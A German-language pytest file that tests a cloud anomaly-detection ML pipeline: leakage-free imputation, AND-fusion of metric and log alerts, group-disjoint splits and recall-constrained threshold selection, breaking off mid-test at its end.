"""
Tests für die CloudAnoBench Pipeline.

Prüft Korrektheit der Kernmechanismen: kanonische Feature-Matrix,
AND-Fusion, FPR-Reduktion, GroupShuffleSplit-Integrität, Soft Score.
Ausführen mit: pytest tests/
"""

import numpy as np
import pandas as pd
import pytest
from sklearn.model_selection import GroupShuffleSplit


# ---------------------------------------------------------------------------
# Kernfunktion aus Notebook 1 — direkt hier definiert für isolierte Unit-Tests.
# Spiegelt die neue NB01-Implementierung: nur Schemaharmonisierung + Konvertierung,
# KEINE Medianimputation (Leakage-Prävention durch Nicht-Imputation in NB01).
# ---------------------------------------------------------------------------

def build_canonical_matrix(df, canonical_features, fit_medians=None):
    """
    Schemaharmonisierung und numerische Konvertierung für das kanonische Feature-Set.
    Keine Medianimputation — NaN verbleiben für leakage-freie Behandlung in Notebook 2.
    fit_medians: veraltet, wird nicht verwendet.
    """
    df = df.copy()
    for col in canonical_features:
        if col not in df.columns:
            df[col] = np.nan
    df = df[[c for c in sorted(canonical_features)]].copy()
    for col in sorted(canonical_features):
        if not pd.api.types.is_numeric_dtype(df[col]):
            df[col] = df[col].astype(str).str.strip().str.strip('"\'')
        df[col] = pd.to_numeric(df[col], errors='coerce')
    # Keine Imputation — NaN verbleiben
    return df, {}


# ---------------------------------------------------------------------------
# Tests: build_canonical_matrix
# ---------------------------------------------------------------------------

class TestBuildCanonicalMatrix:

    def test_missing_column_added_as_nan(self):
        """Spalte die im Schema fehlt wird ergänzt — kein KeyError im Downstream."""
        df = pd.DataFrame({'a': [1.0, 2.0]})
        result, _ = build_canonical_matrix(df, canonical_features=['a', 'b'])
        assert 'b' in result.columns
        assert result['b'].isna().all()

    def test_no_pre_split_imputation(self):
        """
        NB01 build_canonical_matrix darf KEINE Imputation durchführen.
        NaN-Werte müssen als NaN erhalten bleiben — leakage-freie Imputation
        erfolgt in NB02 ausschließlich auf Basis der Trainingszeilen.
        """
        df = pd.DataFrame({'x': [1.0, 2.0, 3.0, np.nan]})
        result, medians = build_canonical_matrix(df, ['x'])
        # NaN muss erhalten bleiben (keine Vorimputation)
        assert result['x'].iloc[3] != result['x'].iloc[3], \
            "NaN muss als NaN erhalten bleiben — keine Vorimputation in NB01"
        # Rückgabe-Medians ist leer (keine Berechnung mehr)
        assert medians == {}, \
            "build_canonical_matrix darf keine Mediane berechnen oder zurückgeben"

    def test_nan_preserved_after_schema_harmonization(self):
        """
        Strukturelle NaN (fehlende Spalten im Schema) und konvertierungsbedingte NaN
        (unlesbare Werte) verbleiben als NaN in den Parquet-Dateien.
        """
        df = pd.DataFrame({'x': [1.0, np.nan, 3.0], 'y': [np.nan, 2.0, np.nan]})
        result, _ = build_canonical_matrix(df, ['x', 'y'])
        # NaN müssen erhalten bleiben (keine Imputation)
        assert result['x'].isnull().sum() == 1, "Genau 1 NaN in x erwartet"
        assert result['y'].isnull().sum() == 2, "Genau 2 NaN in y erwartet"

    def test_quoted_string_values_coerced_to_float(self):
        """
        String-Werte mit Anführungszeichen (residual aus quoting=3) werden
        korrekt zu float konvertiert — kritisch für mali-Dateien mit CSV-Encoding.
        """
        df = pd.DataFrame({'x': ['"1.5"', '"2.0"', '"3.5"']})
        result, _ = build_canonical_matrix(df, ['x'])
        assert pd.api.types.is_float_dtype(result['x'])
        assert result['x'].iloc[0] == pytest.approx(1.5)


# ---------------------------------------------------------------------------
# Regressionstests: Leakage-freie Zeilenimputation (Phase 3 Korrektur)
# ---------------------------------------------------------------------------

class TestRowLevelImputation:
    """
    Regressionstests für die korrigierte Imputationslogik.

    Sichert:
    - Keine Medianimputation vor dem Split in NB01 (build_canonical_matrix).
    - Imputationsmediane ausschließlich aus Trainingszeilen.
    - Einheitlicher Median je Feature für alle dataset_types und alle Splits.
    - Val- und Test-Werte beeinflussen die Mediane nicht.
    - Finale 25 Case-Level-Features enthalten keine NaN.
    """

    def _make_row_data(self):
        """
        Synthetisches Zeilendatensatz mit drei dataset_types und bekannten NaN.
        Alle drei dataset_types haben cpu_usage-Werte; net_out hat NaN in mali.
        """
        rng = np.random.default_rng(0)
        rows = []
        # train cases (mali: 3, anom: 4, norm: 4)
        for case_id in ['m_tr_1', 'm_tr_2', 'm_tr_3']:
            for _ in range(5):
                rows.append({'case_id': case_id, 'dataset_type': 'mali', 'split': 'train',
                             'cpu_usage': rng.uniform(0.5, 0.9),
                             'net_out':   np.nan if rng.random() < 0.3 else rng.uniform(1, 5)})
        for case_id in ['a_tr_1', 'a_tr_2', 'n_tr_1', 'n_tr_2']:
            dt = 'anom' if case_id.startswith('a') else 'norm'
            for _ in range(5):
                rows.append({'case_id': case_id, 'dataset_type': dt, 'split': 'train',
                             'cpu_usage': rng.uniform(0.1, 0.6),
                             'net_out':   rng.uniform(0.5, 3)})
        # val cases
        for case_id in ['m_val_1', 'n_val_1']:
            dt = 'mali' if case_id.startswith('m') else 'norm'
            for _ in range(5):
                rows.append({'case_id': case_id, 'dataset_type': dt, 'split': 'val',
                             'cpu_usage': rng.uniform(0.8, 1.0),  # val hat höhere cpu_usage
                             'net_out':   np.nan if (dt == 'mali' and rng.random() < 0.5) else rng.uniform(2, 8)})
        # test cases
        for case_id in ['m_te_1', 'n_te_1']:
            dt = 'mali' if case_id.startswith('m') else 'norm'
            for _ in range(5):
                rows.append({'case_id': case_id, 'dataset_type': dt, 'split': 'test',
                             'cpu_usage': rng.uniform(0.9, 1.5),  # test hat noch höhere cpu_usage
                             'net_out':   rng.uniform(3, 10)})
        return pd.DataFrame(rows)

    def _compute_train_median(self, df, feature, train_case_ids):
        """Berechnet Median ausschließlich aus Trainingszeilen."""
        train_mask = df['case_id'].isin(train_case_ids)
        return float(df.loc[train_mask, feature].median())

    def test_no_pre_split_imputation_in_canonical_matrix(self):
        """
        build_canonical_matrix imputed keine Werte.
        NaN-Werte vor dem Split dürfen nicht gefüllt werden.
        """
        df = pd.DataFrame({'cpu_usage': [0.5, np.nan, 0.7, np.nan, 0.6]})
        result, medians = build_canonical_matrix(df, ['cpu_usage'])
        assert medians == {}, "Keine Mediane dürfen in NB01 berechnet werden"
        assert result['cpu_usage'].isnull().sum() == 2, \
            "NaN müssen als NaN erhalten bleiben (keine Vorimputation)"

    def test_imputation_medians_from_train_rows_only(self):
        """
        Imputationsmediane stammen ausschließlich aus Trainingszeilen.
        Val- und Test-Zeilen dürfen nicht in die Medianberechnung einfließen.
        """
        df = self._make_row_data()
        train_ids = set(df[df['split'] == 'train']['case_id'].unique())

        median_train = self._compute_train_median(df, 'cpu_usage', train_ids)

        # Val hat höhere cpu_usage → globaler Median wäre größer als Train-Median
        all_median = float(df['cpu_usage'].median())
        # Sicherstellung: Train-Median < All-Median (Testintegrität)
        assert median_train < all_median, \
            "Synthetischer Test nicht differenziert: Train-Median ≥ Gesamt-Median"
        # Nach Imputation: Train-Median verwenden, nicht All-Median
        assert median_train != pytest.approx(all_median), \
            "Train-Median und Gesamt-Median sind identisch — Test prüft kein reales Szenario"

    def test_same_median_applied_to_all_dataset_types(self):
        """
        Derselbe Train-basierte Median je Feature wird auf alle dataset_types angewendet.
        Kein dataset_type-bedingter Imputationswert.
        """
        df = self._make_row_data()
        train_ids = set(df[df['split'] == 'train']['case_id'].unique())
        global_train_median = self._compute_train_median(df, 'net_out', train_ids)

        # Imputation durchführen (wie in NB02)
        df_imp = df.copy()
        df_imp['net_out'] = df_imp['net_out'].fillna(global_train_median)

        # Für alle dataset_types: NaN-Werte wurden mit DEMSELBEN Median gefüllt
        for dt in ['mali', 'anom', 'norm']:
            sub = df_imp[df_imp['dataset_type'] == dt]
            assert sub['net_out'].isnull().sum() == 0, \
                f"NaN in net_out für {dt} nach Imputation"
            # Imputierte Werte (früher NaN) sind alle == global_train_median
            was_nan_original = df.loc[df['dataset_type'] == dt, 'net_out'].isnull()
            if was_nan_original.any():
                imputed_vals = df_imp.loc[
                    (df['dataset_type'] == dt) & was_nan_original, 'net_out'
                ]
                assert (imputed_vals - global_train_median).abs().max() < 1e-9, \
                    f"Imputierte Werte in {dt} ≠ globalem Train-Median"

    def test_val_test_do_not_influence_medians(self):
        """
        Val- und Test-Zeilen beeinflussen die Imputationsmediane nicht.
        Würden Val/Test einbezogen, wäre der Median anders als train-only.
        """
        df = self._make_row_data()
        train_ids = set(df[df['split'] == 'train']['case_id'].unique())

        median_train_only = self._compute_train_median(df, 'cpu_usage', train_ids)
        median_with_val_test = float(df['cpu_usage'].median())

        assert median_train_only != pytest.approx(median_with_val_test), \
            ("Train-only-Median ≈ Gesamt-Median — Testdaten unterscheiden sich nicht genug "
             "um Val/Test-Leakage zu erkennen")

    def test_no_nan_in_final_25_features_after_imputation(self):
        """
        Nach Zeilenimputation und Case-Level-Aggregation enthalten die 25 Features
        keine NaN (vorausgesetzt jeder Case hat >= 1 Zeile nach Imputation).
        """
        from scipy.stats import linregress

        df = self._make_row_data()
        train_ids = set(df[df['split'] == 'train']['case_id'].unique())

        # Zeilenimputation
        for feat in ['cpu_usage', 'net_out']:
            med = self._compute_train_median(df, feat, train_ids)
            df[feat] = df[feat].fillna(med)

        assert df['cpu_usage'].isnull().sum() == 0, "cpu_usage NaN nach Zeilenimputation"
        assert df['net_out'].isnull().sum() == 0, "net_out NaN nach Zeilenimputation"

        # Case-Level-Aggregation
        def _slope(s):
            v = s.dropna().values
            if len(v) < 3:
                return np.nan
            return float(linregress(np.arange(len(v), dtype=float), v).slope)

        feature_parts = []
        for m in ['cpu_usage', 'net_out']:
            grp = df.groupby('case_id')[m]
            part = pd.DataFrame({
                f'{m}_mean': grp.mean(),
                f'{m}_max':  grp.max(),
                f'{m}_std':  grp.std(ddof=1),
                f'{m}_p95':  grp.quantile(0.95),
                f'{m}_slope': grp.apply(_slope),
            })
            feature_parts.append(part)

        feat_df = pd.concat(feature_parts, axis=1).reset_index()
        feat_cols = [c for c in feat_df.columns if c != 'case_id']

        # Ergänzende Case-Level-Imputation mit X_train-Medianen
        train_feat = feat_df[feat_df['case_id'].isin(train_ids)].set_index('case_id')
        case_feature_medians = train_feat[feat_cols].median()

        for col in feat_cols:
            if feat_df[col].isnull().any():
                feat_df[col] = feat_df[col].fillna(case_feature_medians[col])

        assert feat_df[feat_cols].isnull().sum().sum() == 0, \
            "NaN in Case-Level-Features nach Imputation"

    def test_split_assignments_unchanged(self):
        """
        docs/split_assignments.csv muss die invarianten Splitgrößen enthalten.
        Train=793, Val=206, Test=253; Test: mali=48, anom=76, norm=129.
        """
        split_path = os.path.join(DOCS_DIR, 'split_assignments.csv')
        assert os.path.exists(split_path), f"split_assignments.csv fehlt unter {split_path}"
        sa = pd.read_csv(split_path)

        n_train = int((sa['split'] == 'train').sum())
        n_val   = int((sa['split'] == 'val').sum())
        n_test  = int((sa['split'] == 'test').sum())
        assert n_train == 793, f"Train-Cases: erwartet 793, gefunden {n_train}"
        assert n_val   == 206, f"Val-Cases: erwartet 206, gefunden {n_val}"
        assert n_test  == 253, f"Test-Cases: erwartet 253, gefunden {n_test}"

        test_df = sa[sa['split'] == 'test']
        assert int((test_df['dataset_type'] == 'mali').sum()) == 48,  "Test mali ≠ 48"
        assert int((test_df['dataset_type'] == 'anom').sum()) == 76,  "Test anom ≠ 76"
        assert int((test_df['dataset_type'] == 'norm').sum()) == 129, "Test norm ≠ 129"

        # Keine Case-ID in mehreren Splits
        duplicates = sa.groupby('case_id')['split'].nunique()
        assert (duplicates > 1).sum() == 0, "Case-IDs in mehreren Splits!"

        # Keine group_id in mehreren Splits
        group_dups = sa.groupby('group_id')['split'].nunique()
        assert (group_dups > 1).sum() == 0, "group_ids in mehreren Splits!"


# ---------------------------------------------------------------------------
# Tests: AND-Fusion und Soft Score
# ---------------------------------------------------------------------------

class TestFusionLogic:

    def test_and_gate_truth_table(self):
        """
        AND-Gate: alert=1 nur wenn metric_trigger=1 UND log_trigger=1.
        Vollständige Wahrheitstabelle — stellt sicher dass keine Verwechslung
        mit OR-Gate oder einseitiger Filterung vorliegt.
        """
        fusion = pd.DataFrame({
            'metric_trigger': [1, 1, 0, 0],
            'log_trigger':    [1, 0, 1, 0],
        })
        fusion['alert'] = (
            (fusion['metric_trigger'] == 1) & (fusion['log_trigger'] == 1)
        ).astype(int)
        assert list(fusion['alert']) == [1, 0, 0, 0]

    def test_fpr_fusion_leq_fpr_baseline(self):
        """
        Zentrales Ergebnis der Arbeit: FPR(Fusion) <= FPR(Metrik-Baseline).
        Log-Kontext darf FPR nie erhöhen — nur reduzieren oder halten.
        """
        y_true = np.array([1] * 40 + [0] * 160)

        # Metrik-Baseline: flaggt alles -> FPR = 1.0
        metric_trigger = np.ones(200, dtype=int)

        # Log-Trigger: korrekte TPs + weniger FPs
        log_trigger = np.zeros(200, dtype=int)
        log_trigger[:40] = 1   # alle 40 TPs korrekt erkannt
        log_trigger[40:90] = 1  # 50 der 160 FPs fälschlicherweise log-positiv

        fusion_alert = ((metric_trigger == 1) & (log_trigger == 1)).astype(int)

        n_neg        = (y_true == 0).sum()
        fp_baseline  = (metric_trigger[y_true == 0] == 1).sum()
        fp_fusion    = (fusion_alert[y_true == 0] == 1).sum()
        fpr_baseline = fp_baseline / n_neg
        fpr_fusion   = fp_fusion   / n_neg

        assert fpr_fusion <= fpr_baseline, (
            f"Fusion-FPR ({fpr_fusion:.3f}) darf Baseline-FPR "
            f"({fpr_baseline:.3f}) nicht überschreiten"
        )

    def test_soft_score_in_unit_interval(self):
        """
        Soft Score = max_proba x proba_log muss in [0, 1] liegen —
        Voraussetzung für gültige PR-Kurven-Berechnung.
        """
        rng = np.random.default_rng(42)
        fusion = pd.DataFrame({
            'max_proba': rng.uniform(0, 1, 200),
            'proba_log': rng.uniform(0, 1, 200),
        })
        fusion['score_fusion'] = fusion['max_proba'] * fusion['proba_log']
        assert (fusion['score_fusion'] >= 0.0).all()
        assert (fusion['score_fusion'] <= 1.0).all()


# ---------------------------------------------------------------------------
# Tests: Datenintegrität und Split-Strategie
# ---------------------------------------------------------------------------

class TestDataIntegrity:

    def test_group_shuffle_split_no_group_leakage(self):
        """
        GroupShuffleSplit-Garantie: keine Gruppe erscheint in Train UND Test.
        Verletzung würde temporale Autokorrelation im Test ermöglichen.
        """
        X = pd.DataFrame({'x': range(100)})
        groups = np.array([f'scenario_{i // 10}' for i in range(100)])

        gss = GroupShuffleSplit(n_splits=1, test_size=0.2, random_state=42)
        train_idx, test_idx = next(gss.split(X, groups=groups))

        train_groups = set(groups[train_idx])
        test_groups  = set(groups[test_idx])
        overlap = train_groups & test_groups

        assert len(overlap) == 0, (
            f"Gruppen-Leakage entdeckt — folgende Gruppen in Train UND Test: {overlap}"
        )

    def test_universal_five_features_present_in_all_datasets(self):
        """
        Die 5 universellen Features müssen in allen drei Datasets vorhanden sein —
        Schema-Leakage-Prüfung aus Phase 1 (verhindert aucpr=1.0 durch NaN-Muster).
        """
        universal = {'cpu_usage', 'mem_usage', 'disk_io', 'net_in', 'net_out'}

        # Synthetisch: repräsentiert die realen Schema-Unterschiede aus P1
        mali_cols = universal | {'mali_only_a', 'mali_only_b'}
        anom_cols = universal | {'anom_only_a'}
        norm_cols = universal | {'norm_only_a', 'norm_only_b', 'norm_only_c'}

        common = mali_cols & anom_cols & norm_cols
        missing = universal - common

        assert len(missing) == 0, (
            f"Universelle Features fehlen in mindestens einem Dataset: {missing}"
        )


# ---------------------------------------------------------------------------
# Tests: Algorithmen aus P2/P3/P4
# ---------------------------------------------------------------------------

class TestAlgorithmicLogic:

    def test_threshold_selection_highest_at_recall_095(self):
        """
        Threshold-Wahl aus P2/P3: höchster Threshold bei dem Recall >= 0.95 noch gilt.
        Konservativste Grenze — maximiert FPR-Reduktion ohne Recall-Nebenbedingung zu verletzen.
        """
        # Synthetische PR-Kurve: recalls fallend, thresholds steigend
        recalls    = np.array([1.0, 0.98, 0.96, 0.95, 0.93, 0.90])
        thresholds = np.array([0.1,  0.2,  0.3,  0.4,  0.5])

        # Gleiche Logik wie P2/P3: recalls[:-1] wegen sklearn off-by-one
        valid = thresholds[recalls[:-1] >= 0.95]
        best_threshold = float(valid.max())


        # recalls[:-1] = [1.0, 0.98, 0.96, 0.95, 0.93]
        # >= 0.95 trifft auf Index 0-3 zu (0.95 ist eingeschlossen) → valid=[0.1, 0.2, 0.3, 0.4]
        # Höchster valider Threshold ist 0.4 (recall=0.95 erfüllt die >= Bedingung genau)
        assert best_threshold == pytest.approx(0.4), (
            f"Threshold muss 0.4 sein (höchster bei recall>=0.95), erhalten: {best_threshold}"
        )
        

    def test_threshold_selection_recall_constraint_holds(self):
        """
        Recall-Nebenbedingung >= 0.95 muss nach Threshold-Anwendung erfüllt sein.
        Stellt sicher dass die Threshold-Logik die harte Recall-Anforderung nicht verletzt.
        """
        np.random.seed(42)
        y_true  = np.array([1] * 50 + [0] * 200)
        y_proba = np.concatenate([
            np.random.uniform(0.6, 1.0, 50),   # positive: hohe Scores
            np.random.uniform(0.0, 0.5, 200),   # negative: niedrige Scores
        ])

        from sklearn.metrics import precision_recall_curve, recall_score
        _, recalls_curve, thresholds_curve = precision_recall_curve(y_true, y_proba)
        valid = thresholds_curve[recalls_curve[:-1] >= 0.95]
        threshold = float(valid.max()) if len(valid) > 0 else float(thresholds_curve[0])

        y_pred = (y_proba >= threshold).astype(int)
        assert recall_score(y_true, y_pred) >= 0.95, \
            f"Recall {recall_score(y_true, y_pred):.3f} unterschreitet Nebenbedingung 0.95"

    def test_max_aggregation_row_to_case_level(self):
        """
        max-Aggregation aus P4: ein einzelner anomaler Metrik-Peak (Zeile) genügt
        um den gesamten Case zu flaggen — semantisch korrekt für Anomalie-Erkennung.
        """
        rows = pd.DataFrame({
            'case_id':   ['c1', 'c1', 'c1', 'c2', 'c2'],
            'proba_xgb': [0.9,  0.1,  0.2,  0.3,  0.4],
            'label':     [1,    1,    1,    0,    0],
        })
        cases = (rows.groupby('case_id')
                     .agg(max_proba=('proba_xgb', 'max'),
                          label=('label', 'max'))
                     .reset_index())

        # c1: max=0.9 (ein Peak genügt), c2: max=0.4
        assert cases.loc[cases['case_id'] == 'c1', 'max_proba'].iloc[0] == pytest.approx(0.9)
        assert cases.loc[cases['case_id'] == 'c2', 'max_proba'].iloc[0] == pytest.approx(0.4)
        # label via max: alle Zeilen gleich, max ist identisch
        assert cases.loc[cases['case_id'] == 'c1', 'label'].iloc[0] == 1


    def test_tfidf_vocabulary_fitted_on_train_only(self):
        """
        TF-IDF aus P3: Vokabular wird nur auf Trainingsdaten gefittet (kein Leakage).
        Terme die ausschließlich im Testset vorkommen dürfen nicht im Vokabular auftauchen.
     """
        from sklearn.feature_extraction.text import TfidfVectorizer

        train_texts = ["error login failed", "memory high cpu spike", "disk io burst"]
        test_texts  = ["supersecrettoken attack detected", "error login failed"]

        vectorizer = TfidfVectorizer()
        vectorizer.fit(train_texts)

        # "supersecrettoken" kommt nur im Test vor → darf nicht im Vokabular sein
        assert "supersecrettoken" not in vectorizer.vocabulary_, (
            "Test-exklusiver Term darf nicht im Train-Vokabular erscheinen (Leakage)"
        )
        # "error" kommt in beiden vor → muss im Vokabular sein
        assert "error" in vectorizer.vocabulary_


# ---------------------------------------------------------------------------
# Tests: Dreistufige Validation-Split-Methodik (neue Anforderungen)
# ---------------------------------------------------------------------------

class TestValidationSplit:

    def _make_three_way_split(self, n=120, n_groups=10):
        """Helper: erzeugt drei disjunkte Splits aus synthetischen Daten."""
        X = pd.DataFrame({'x': range(n)})
        y = pd.Series([1 if i < n // 5 else 0 for i in range(n)])
        groups = np.array([f'g{i // (n // n_groups)}' for i in range(n)])

        gss1 = GroupShuffleSplit(n_splits=1, test_size=0.2, random_state=42)
        trainval_idx, test_idx = next(gss1.split(X, y, groups))

        X_tv = X.iloc[trainval_idx]
        y_tv = y.iloc[trainval_idx]
        g_tv = groups[trainval_idx]

        gss2 = GroupShuffleSplit(n_splits=1, test_size=0.2, random_state=0)
        train_idx, val_idx = next(gss2.split(X_tv, y_tv, g_tv))

        train_groups = set(g_tv[train_idx])
        val_groups   = set(g_tv[val_idx])
        test_groups  = set(groups[test_idx])
        return train_groups, val_groups, test_groups, y_tv.iloc[val_idx]

    def test_three_way_group_disjointness(self):
        """
        Drei-Wege-Disjunktheit: Train ∩ Val = ∅, Val ∩ Test = ∅, Train ∩ Test = ∅.
        Verschachtelte GroupShuffleSplits können trotz korrekter Einzelschritte
        heimliche Überschneidungen erzeugen — dieser Test sichert alle drei Paare ab.
        """
        train_g, val_g, test_g, _ = self._make_three_way_split()
        assert len(train_g & val_g)  == 0, f"Train ∩ Val nicht leer: {train_g & val_g}"
        assert len(val_g  & test_g)  == 0, f"Val ∩ Test nicht leer: {val_g & test_g}"
        assert len(train_g & test_g) == 0, f"Train ∩ Test nicht leer: {train_g & test_g}"

    def test_validation_contains_positive_and_negative_cases(self):
        """
        Val-Set muss nach Seed-Wahl beide Klassen enthalten.
        Verwendet ein synthetisches Dataset wo JEDE Gruppe Positive und Negative
        enthält — dadurch enthält jeder val-Split mindestens einen positiven Fall.
        """
        # Jede Gruppe hat 3 Positive und 7 Negative → kein val-Split kann alle
        # Positiven verlieren, unabhängig welche Gruppen zufällig zugewiesen werden.
        n = 100
        groups = np.array([f'g{i // 10}' for i in range(n)])   # 10 Gruppen à 10
        y = pd.Series([1 if i % 10 < 3 else 0 for i in range(n)])  # 3/10 pro Gruppe positiv
        X = pd.DataFrame({'x': range(n)})

        gss1 = GroupShuffleSplit(n_splits=1, test_size=0.2, random_state=42)
        trainval_idx, _ = next(gss1.split(X, y, groups))
        X_tv = X.iloc[trainval_idx]
        y_tv = y.iloc[trainval_idx]
        g_tv = groups[trainval_idx]

        # Simuliert _pick_val_seed: erster Seed der Val >= 1 positive Fall liefert
        selected_seed = None
        final_val_y   = None
        for seed in (0, 1, 2, 7, 42):
            gss2 = GroupShuffleSplit(n_splits=1, test_size=0.2, random_state=seed)
            tr_idx, vl_idx = next(gss2.split(X_tv, y_tv, g_tv))
            if y_tv.iloc[vl_idx].sum() >= 1:
                selected_seed = seed
                final_val_y   = y_tv.iloc[vl_idx]
                break

        assert selected_seed is not None, (
            "Kein Seed in (0,1,2,7,42) liefert Val mit positiven Fällen."
        )
        assert final_val_y.sum() >= 1,        "Val enthält nach Seed-Wahl keine positiven Fälle."
        assert (final_val_y == 0).sum() >= 1, "Val enthält nach Seed-Wahl keine negativen Fälle."

    def test_threshold_selected_from_validation_scores(self):
        """
        Threshold-Wahl muss aus Val-Scores stammen — niemals aus Test-Scores.
        Val und Test haben unterschiedliche optimale Thresholds; Funktion gibt
        den Val-Threshold zurück und nicht den Test-Threshold.
        """
        from sklearn.metrics import precision_recall_curve

        rng = np.random.default_rng(7)
        y_val  = np.array([1]*30 + [0]*70)
        p_val  = np.concatenate([rng.uniform(0.7, 1.0, 30), rng.uniform(0.0, 0.4, 70)])
        y_test = np.array([1]*30 + [0]*70)
        p_test = np.concatenate([rng.uniform(0.4, 0.9, 30), rng.uniform(0.1, 0.7, 70)])

        def _select_threshold(y, proba):
            _, rec, thr = precision_recall_curve(y, proba)
            valid = thr[rec[:-1] >= 0.95]
            return float(valid.max()) if len(valid) > 0 else float(thr[0])

        thr_val  = _select_threshold(y_val,  p_val)
        thr_test = _select_threshold(y_test, p_test)

        # Val und Test müssen unterschiedliche Thresholds liefern (sonst ist der Test wertlos)
        assert thr_val != thr_test, (
            "Val- und Test-Threshold sind identisch — Test prüft kein reales Szenario."
        )
        # Der korrekte Code verwendet thr_val; thr_test ist unbekannt im echten Notebook
        assert thr_val > 0.0, "Val-Threshold muss positiv sein."

    def test_scale_pos_weight_from_train_only(self):
        """
        scale_pos_weight muss aus Train-Labels berechnet werden.
        Werden Val-Labels einbezogen, verändert sich das Verhältnis — dieser Test
        stellt sicher dass die Berechnungslogik ausschließlich auf Train-Daten basiert.
        """
        y_train = pd.Series([1]*20 + [0]*80)   # 1:4
        y_val   = pd.Series([1]*15 + [0]*35)   # 1:2.33

        spw_train_only   = (y_train == 0).sum() / (y_train == 1).sum()
        spw_with_val_mix = ((y_train == 0).sum() + (y_val == 0).sum()) / \
                           ((y_train == 1).sum() + (y_val == 1).sum())

        # Die Werte müssen unterschiedlich sein (Testintegrität)
        assert abs(spw_train_only - spw_with_val_mix) > 0.1, \
            "Synthetischer Test nicht differenziert genug."
        # scale_pos_weight korrekt: nur Train
        assert spw_train_only == pytest.approx(4.0)
        # scale_pos_weight falsch: Train+Val gemischt weicht von 4.0 ab
        assert not spw_with_val_mix == pytest.approx(4.0), \
            "Val-Einbeziehung muss scale_pos_weight verändern."

    def test_tfidf_vocabulary_not_contaminated_by_val_or_test(self):
        """
        TF-IDF Vokabular darf nach fit auf Train keine Val- oder Test-exklusiven
        Terme enthalten. Erweiterung des bestehenden Tests auf drei Splits.
        """
        from sklearn.feature_extraction.text import TfidfVectorizer

        train_texts = ["error login failed", "memory high cpu spike", "disk io burst"]
        val_texts   = ["valtoken connection reset", "error login failed"]
        test_texts  = ["supersecrettoken attack detected", "error login failed"]

        vectorizer = TfidfVectorizer()
        vectorizer.fit(train_texts)  # nur auf Train!

        assert "valtoken"         not in vectorizer.vocabulary_, \
            "Val-exklusiver Term 'valtoken' im Vokabular (Leakage)"
        assert "supersecrettoken" not in vectorizer.vocabulary_, \
            "Test-exklusiver Term 'supersecrettoken' im Vokabular (Leakage)"
        assert "error" in vectorizer.vocabulary_, \
            "Train-Term 'error' fehlt im Vokabular"

    def test_fusion_uses_test_scores_only(self):
        """
        fusion_cases.csv darf nur Test-Cases enthalten — keine Train/Val-Cases.
        Stellt sicher dass finale Ablations-Metriken nicht durch Train-/Val-Performance
        kontaminiert werden.
        """
        split_df = pd.DataFrame({
            'case_id': [f'c{i}' for i in range(10)],
            'split':   ['train']*4 + ['val']*3 + ['test']*3
        })
        fusion_df = pd.DataFrame({
            'case_id': [f'c{i}' for i in range(7, 10)],  # nur test cases c7, c8, c9
            'label':   [1, 0, 0]
        })

        test_ids       = set(split_df[split_df['split'] == 'test']['case_id'])
        fusion_ids     = set(fusion_df['case_id'])
        non_test_in_fusion = fusion_ids - test_ids

        assert len(non_test_in_fusion) == 0, (
            f"Nicht-Test-Cases in Fusion: {non_test_in_fusion}"
        )


# ---------------------------------------------------------------------------
# Tests: Threshold-Sensitivity-Analyse
# ---------------------------------------------------------------------------

def _compute_sensitivity_table(y_val, p_val, y_test, p_test, targets):
    """
    Für jedes Recall-Ziel: höchsten Val-Threshold wählen → auf Test anwenden.
    Gibt Liste von Dicts zurück. Threshold-Wahl AUSSCHLIESSLICH aus Val-Scores.
    """
    from sklearn.metrics import (precision_recall_curve, recall_score,
                                  precision_score, f1_score, confusion_matrix)
    _, rec_val, thr_val = precision_recall_curve(y_val, p_val)
    rows = []
    for target in targets:
        valid = thr_val[rec_val[:-1] >= target]
        thr   = float(valid.max()) if len(valid) > 0 else float(thr_val[0])
        val_rec = float(recall_score(y_val, (p_val >= thr).astype(int)))
        y_pred  = (p_test >= thr).astype(int)
        tn, fp, fn, tp = confusion_matrix(y_test, y_pred).ravel()
        rows.append({
            'target_recall_val': target,
            'threshold_val':     thr,
            'val_recall':        val_rec,
            'test_recall':       float(recall_score(y_test, y_pred)),
            'test_fpr':          fp / (fp + tn) if (fp + tn) > 0 else 0.0,
            'test_precision':    float(precision_score(y_test, y_pred, zero_division=0)),
            'test_f1':           float(f1_score(y_test, y_pred, zero_division=0)),
            'TP': tp, 'FP': fp, 'TN': tn, 'FN': fn,
        })
    return rows


class TestThresholdSensitivity:
    """Prüft die Threshold-Sensitivity-Analyse der Log-Komponente."""

    TARGETS = [0.95, 0.975, 0.99, 1.00]

    def _make_data(self):
        rng = np.random.default_rng(42)
        y_val  = np.array([1]*30 + [0]*70)
        p_val  = np.concatenate([rng.uniform(0.6, 1.0, 30), rng.uniform(0.0, 0.4, 70)])
        y_test = np.array([1]*25 + [0]*75)
        p_test = np.concatenate([rng.uniform(0.5, 0.95, 25), rng.uniform(0.0, 0.5, 75)])
        return y_val, p_val, y_test, p_test

    def test_table_contains_all_targets(self):
        """Jedes Recall-Ziel muss in der Tabelle vertreten sein."""
        y_val, p_val, y_test, p_test = self._make_data()
        rows = _compute_sensitivity_table(y_val, p_val, y_test, p_test, self.TARGETS)
        found = [r['target_recall_val'] for r in rows]
        assert found == self.TARGETS, f"Erwartete Targets {self.TARGETS}, erhalten {found}"

    def test_threshold_uses_only_val_scores(self):
        """Threshold-Wahl ohne Test-Scores möglich — Test-Daten sind kein Input."""
        y_val, p_val, _, _ = self._make_data()
        from sklearn.metrics import precision_recall_curve
        _, rec_val, thr_val = precision_recall_curve(y_val, p_val)
        for target in self.TARGETS:
            valid = thr_val[rec_val[:-1] >= target]
            thr   = float(valid.max()) if len(valid) > 0 else float(thr_val[0])
            assert thr >= 0.0, f"Threshold für target={target} ist negativ: {thr}"

    def test_higher_target_recall_not_higher_threshold(self):
        """
        Höheres Recall-Ziel → gleicher oder niedrigerer Threshold.
        Monotonie: um mehr Positive zu treffen muss die Entscheidungsgrenze fallen.
        """
        y_val, p_val, y_test, p_test = self._make_data()
        rows = _compute_sensitivity_table(y_val, p_val, y_test, p_test, self.TARGETS)
        thresholds = [r['threshold_val'] for r in rows]
        for i in range(1, len(thresholds)):
            assert thresholds[i] <= thresholds[i-1] + 1e-9, (
                f"Threshold stieg bei höherem Recall-Ziel: "
                f"target={self.TARGETS[i-1]}→{self.TARGETS[i]}, "
                f"thr={thresholds[i-1]:.4f}→{thresholds[i]:.4f}"
            )

    def test_metrics_in_unit_interval(self):
        """Alle Metriken (Recall, FPR, Precision, F1) müssen in [0, 1] liegen."""
        y_val, p_val, y_test, p_test = self._make_data()
        rows = _compute_sensitivity_table(y_val, p_val, y_test, p_test, self.TARGETS)
        for r in rows:
